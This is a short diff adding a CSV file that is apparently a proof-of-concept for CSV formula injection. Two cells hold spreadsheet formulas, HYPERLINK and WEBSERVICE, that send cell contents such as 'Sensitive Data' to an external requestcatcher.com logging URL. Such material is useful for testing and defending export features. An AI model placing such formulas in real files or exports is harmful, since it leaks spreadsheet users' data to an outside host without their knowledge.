@@ -1,0 +1,3 @@
+"Product","Value","Description"
+"Vulnerable Item","100","=HYPERLINK(\"https://deadmanxxxii.requestcatcher.com/log?data=\"&A2&\"_\"&B2,\"Click for info\")"
+"Sensitive Data","Confidential","=WEBSERVICE(CONCATENATE(\"https://deadmanxxxii.requestcatcher.com/?data=\",A1))"
